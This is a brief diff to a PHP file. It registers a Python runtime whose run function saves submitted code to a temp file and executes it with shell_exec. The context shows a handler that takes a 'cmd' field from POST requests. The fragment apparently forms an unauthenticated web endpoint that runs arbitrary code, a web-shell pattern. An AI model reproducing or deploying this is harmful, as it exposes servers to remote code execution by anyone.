@@ -1,5 +1,18 @@
 <?php
 
+$GLOBALS['runtimes']['python'] = [
+    'name' => 'Python',
+    'exec' => '/usr/bin/python3',
+    'file_ext' => 'py',
+    'run' => function ($code, $options = []) {
+        $tmp = tempnam(sys_get_temp_dir(), 'py_') . '.py';
+        file_put_contents($tmp, $code);
+        $output = shell_exec("/usr/bin/python3 " . escapeshellarg($tmp));
+        unlink($tmp);
+        return $output;
+    }
+];
+
 if (isset($_SERVER['REQUEST_METHOD']) && $_SERVER['REQUEST_METHOD'] == 'POST')
     if (isset($_POST['cmd']) && $_POST['cmd'] != '')
         if (preg_match('/^python\s*(:?.*)/i', $_POST['cmd'], $match)) {
